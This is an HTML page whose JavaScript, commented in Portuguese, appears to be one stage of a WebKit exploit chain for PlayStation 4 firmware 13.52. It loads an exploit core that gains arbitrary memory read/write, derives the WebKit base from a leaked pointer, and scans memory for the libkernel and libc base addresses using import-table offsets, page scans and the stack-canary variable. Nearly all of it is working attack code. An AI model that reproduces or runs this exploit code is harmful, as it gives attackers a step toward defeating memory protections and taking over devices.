<body>

<h1>PS4 WebKit Exploit (13.52)</h1>

<script type="module">
import { int64 }              from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP }     from './resources/mem.js';
globalThis.int64 = int64;

const $con = document.getElementById('con');
const $dot = document.getElementById('dot');
const $st  = document.getElementById('st');
const $fw  = document.getElementById('fw');

function log(m, c='i') {
  const d = document.createElement('div');
  d.className = c; d.textContent = m;
  $con.appendChild(d);
  $con.scrollTop = $con.scrollHeight;
  while ($con.children.length > 600) $con.removeChild($con.firstChild);
}
function logH(m) { log('=== ' + m + ' ===', 's'); }
function setStatus(m, s='r') { $st.textContent = m; $dot.className = s; }
function setCard(id, v) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = v; el.classList.remove('na');
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function safeRead32(p, addr) {
  try { return p.read32(addr); } catch(e) { return null; }
}

function safeRead64(p, addr) {
  try { return p.read8(addr); } catch(e) { return null; }
}

// ═════════════════════════════════════════════════════════════════════════════
// ABORDAGEM 1: Varredura de import table do WebKit (offsets típicos)
// No PS4, imports ficam em offsets conhecidos dentro do binário WebKit
// ═════════════════════════════════════════════════════════════════════════════

async function findViaWebKitImports(p, webkitBase) {
  logH('PROCURANDO IMPORTS NO WEBKIT');

  // Offsets típicos de import table no WebKit PS4 (próximos a 0x3D00000)
  // Vamos tentar uma grade espaçada de offsets
  const testOffsets = [
    0x3D00000, 0x3D01000, 0x3D02000, 0x3D03000, 0x3D04000,
    0x3D05000, 0x3D06000, 0x3D07000, 0x3D08000, 0x3D09000,
    0x3D0A000, 0x3D0B000, 0x3D0C000, 0x3D0D000, 0x3D0E000, 0x3D0F000,
    0x3D10000, 0x3D20000, 0x3D30000, 0x3D40000
  ];

  let lkCands = [];
  let lcCands = [];

  for (let off of testOffsets) {
    await sleep(5);
    let ptr = safeRead64(p, webkitBase.add32(off));
    if (!ptr) continue;

    let hi = ptr.hi;
    let lo = ptr.low;

    // Pular nulos e não-alinhados
    if (lo === 0 && hi === 0) continue;
    if ((lo & 0x7) !== 0) continue;

    // libkernel: hi=0x08 (ex: 0x00000008045c7400)
    if (hi === 0x08) {
      try { p.read8(ptr); lkCands.push({off, ptr}); } catch(e) {}
    }
    // libc: hi=0x09 (ex: 0x000000093840fc00)
    else if (hi === 0x09) {
      try { p.read8(ptr); lcCands.push({off, ptr}); } catch(e) {}
    }

    if (lkCands.length > 0 || lcCands.length > 0) {
      log('  off=0x' + off.toString(16) + ' ptr=0x' + ptr.toString(16) + (hi===0x08?' [LK]':hi===0x09?' [LC]':''), 'd');
    }

    if (lkCands.length >= 3 && lcCands.length >= 3) break;
  }

  log('[+] lk-cands: ' + lkCands.length + ' | lc-cands: ' + lcCands.length);
  return { lkCands, lcCands };
}

// ═════════════════════════════════════════════════════════════════════════════
// ABORDAGEM 2: Varredura de página no espaço de endereços
// Procurar ELF magic em endereços típicos de bibliotecas do PS4
// ═════════════════════════════════════════════════════════════════════════════

async function findViaPageScan(p) {
  logH('VARREDURA DE PÁGINA NO ESPAÇO DE ENDEREÇOS');

  // No PS4, bibliotecas .sprx são carregadas em endereços alinhados a 0x1000
  // libkernel_web.sprx geralmente está na região 0x800000000 - 0x8040000000
  // libSceLibcInternal.sprx geralmente está na região 0x900000000 - 0x9400000000

  let libkernelBase = null;
  let libcBase = null;

  // Tentar encontrar libkernel: hi=0x08, variação no low
  // Estratégia: tentar endereços espaçados em 0x100000 (1MB)
  log('[+] Procurando libkernel (hi=0x08)...');
  for (let lo = 0x00400000; lo < 0x01000000; lo += 0x100000) {
    await sleep(10);
    let addr = new int64(lo, 0x08);
    let magic = safeRead32(p, addr);
    if (magic === 0x464C457F) {
      log('[+] libkernel ELF magic em 0x' + addr.toString(16), 'ok');
      libkernelBase = addr;
      break;
    }
  }

  // Se não achou, tentar com hi=0x80 (caso o endereçamento seja diferente)
  if (!libkernelBase) {
    log('[!] Tentando hi=0x80...');
    for (let lo = 0x00400000; lo < 0x01000000; lo += 0x100000) {
      await sleep(10);
      let addr = new int64(lo, 0x80);
      let magic = safeRead32(p, addr);
      if (magic === 0x464C457F) {
        log('[+] libkernel ELF magic em 0x' + addr.toString(16) + ' (hi=0x80)', 'ok');
        libkernelBase = addr;
        break;
      }
    }
  }

  // Tentar encontrar libc: hi=0x09
  log('[+] Procurando libc (hi=0x09)...');
  for (let lo = 0x00400000; lo < 0x01000000; lo += 0x100000) {
    await sleep(10);
    let addr = new int64(lo, 0x09);
    let magic = safeRead32(p, addr);
    if (magic === 0x464C457F) {
      log('[+] libc ELF magic em 0x' + addr.toString(16), 'ok');
      libcBase = addr;
      break;
    }
  }

  // Se não achou, tentar com hi=0x90
  if (!libcBase) {
    log('[!] Tentando hi=0x90...');
    for (let lo = 0x00400000; lo < 0x01000000; lo += 0x100000) {
      await sleep(10);
      let addr = new int64(lo, 0x90);
      let magic = safeRead32(p, addr);
      if (magic === 0x464C457F) {
        log('[+] libc ELF magic em 0x' + addr.toString(16) + ' (hi=0x90)', 'ok');
        libcBase = addr;
        break;
      }
    }
  }

  return { libkernelBase, libcBase };
}

// ═════════════════════════════════════════════════════════════════════════════
// ABORDAGEM 3: Usar __stack_chk_guard via offset fixo no WebKit
// No PS4 9.00, __stack_chk_guard estava em offset ~0x3DXXXXX do WebKit
// ═════════════════════════════════════════════════════════════════════════════

async function findViaStackChkGuard(p, webkitBase) {
  logH('PROCURANDO __stack_chk_guard');

  // __stack_chk_guard é uma variável global na libkernel.
  // O WebKit a referencia em múltiplos lugares do seu código.
  // Vamos procurar por ponteiros com hi=0x08 que apontam para um valor
  // que parece um canary (geralmente com byte 0x00 no final).

  const testOffsets = [
    0x3C00000, 0x3C10000, 0x3C20000, 0x3C30000, 0x3C40000,
    0x3C50000, 0x3C60000, 0x3C70000, 0x3C80000, 0x3C90000,
    0x3CA0000, 0x3CB0000, 0x3CC0000, 0x3CD0000, 0x3CE0000, 0x3CF0000,
    0x3D00000, 0x3D10000, 0x3D20000, 0x3D30000
  ];

  for (let off of testOffsets) {
    await sleep(5);
    let ptr = safeRead64(p, webkitBase.add32(off));
    if (!ptr) continue;
    if (ptr.hi === 0x08 && ptr.low > 0 && (ptr.low & 0x7) === 0) {
      try {
        let val = p.read8(ptr);
        // Canary geralmente tem byte 0x00 no final (para evitar string leak)
        if ((val.low & 0xFF) === 0x00) {
          log('[+] __stack_chk_guard candidato em off=0x' + off.toString(16) + ' ptr=0x' + ptr.toString(16), 'ok');
          // A base da libkernel = ptr - offset_da_variável
          // __stack_chk_guard geralmente está em offset ~0x45000 da libkernel
          let estimatedBase = ptr.sub32(0x45000);
          log('[+] libkernel base estimada: 0x' + estimatedBase.toString(16), 'ok');
          return estimatedBase;
        }
      } catch(e) {}
    }
  }
  return null;
}

// ═════════════════════════════════════════════════════════════════════════════
// VALIDAÇÃO
// ═════════════════════════════════════════════════════════════════════════════

async function validateBase(p, base, name) {
  if (!base) return false;
  let magic = safeRead32(p, base);
  if (magic === 0x464C457F) {
    log('[✓] ' + name + ': ELF magic OK', 'ok');
    return true;
  } else {
    log('[✗] ' + name + ': magic=0x' + (magic ? magic.toString(16) : 'null'), 'e');
    return false;
  }
}

// ═════════════════════════════════════════════════════════════════════════════
// MAIN
// ═════════════════════════════════════════════════════════════════════════════

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC...', 'r');
  logH('EXPLOIT JSC (WebKit)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
        document.getElementById('bg').textContent = 'estágio: ' + tag.toLowerCase();
        log(`[${tag}] ${detail}`, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: concluído!', 'ok');
  setStatus('Instalando R/W...', 'r');
  logH('INSTALANDO R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => { log(`  [mem/${tag}] ${detail}`, 'd'); }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] R/W arbitrário ativo!', 'ok');
  setStatus('Calculando WebKit base...', 'r');
  logH('MAPEAMENTO DA 13.52');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== 'number' || ctor <= 0x100000000) {
    log('[-] __ps5NativeCtor inválido', 'e');
    setStatus('Erro NativeCtor', 'e');
    return;
  }

  const hi = Math.floor(ctor / 0x100000000);
  const lo = ctor - hi * 0x100000000;
  const ctorInt64 = new int64(lo >>> 0, hi >>> 0);
  log('[+] __ps5NativeCtor: 0x' + ctorInt64.toString(16), 'a');

  const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
             ? OFFSET_wk_host_constructor_candidates[0]
             : 0x36F9E20;

  const resolvedBaseVal = ctor - hc;
  const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
  const baseLo = resolvedBaseVal - baseHi * 0x100000000;
  const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);

  log('[+] WebKit Base: 0x' + webkitBase.toString(16), 'ok');
  setCard('c-wk', '0x' + webkitBase.toString(16));

  setTimeout(async () => {
    let libkernelBase = null;
    let libcBase = null;

    // ─── Tentativa 1: Imports do WebKit ───
    let impResult = await findViaWebKitImports(p, webkitBase);
    if (impResult.lkCands.length > 0) {
      for (let c of impResult.lkCands) {
        let base = new int64(c.ptr.low & ~0xFFF, c.ptr.hi);
        if (await validateBase(p, base, 'libkernel')) { libkernelBase = base; break; }
      }
    }
    if (impResult.lcCands.length > 0) {
      for (let c of impResult.lcCands) {
        let base = new int64(c.ptr.low & ~0xFFF, c.ptr.hi);
        if (await validateBase(p, base, 'libc')) { libcBase = base; break; }
      }
    }

    // ─── Tentativa 2: Page scan ───
    if (!libkernelBase || !libcBase) {
      let pageResult = await findViaPageScan(p);
      if (!libkernelBase && pageResult.libkernelBase) libkernelBase = pageResult.libkernelBase;
      if (!libcBase && pageResult.libcBase) libcBase = pageResult.libcBase;
    }

    // ─── Tentativa 3: __stack_chk_guard ───
    if (!libkernelBase) {
      let stkResult = await findViaStackChkGuard(p, webkitBase);
      if (stkResult && await validateBase(p, stkResult, 'libkernel (via stk)')) {
        libkernelBase = stkResult;
      }
    }

    // ─── Resultado ───
    if (libkernelBase) setCard('c-lk', '0x' + libkernelBase.toString(16));
    if (libcBase) setCard('c-lc', '0x' + libcBase.toString(16));

    if (libkernelBase && libcBase) {
      log('[✓] Ambas as bases encontradas!', 'ok');
      setStatus('Bases mapeadas!', 'ok');
      setCard('c-g', 'Pronto');

      document.getElementById('cbox').style.display = 'block';
      document.getElementById('c-out').textContent =
          '__ps5NativeCtor  = 0x' + ctorInt64.toString(16) + '\n' +
          'WebKit Base      = 0x' + webkitBase.toString(16) + '\n' +
          'libkernel Base   = 0x' + libkernelBase.toString(16) + '\n' +
          'libSceLibc Base  = 0x' + libcBase.toString(16) + '\n' +
          'Status           = Mapeamento concluído.';
    } else {
      setStatus('Mapeamento parcial', 'w');
      setCard('c-g', libkernelBase ? 'libc faltando' : 'Falha');
      log('[!] libkernel=' + (libkernelBase ? 'OK' : 'FALHA') + ' libc=' + (libcBase ? 'OK' : 'FALHA'), 'w');
    }
  }, 500);
}

main();
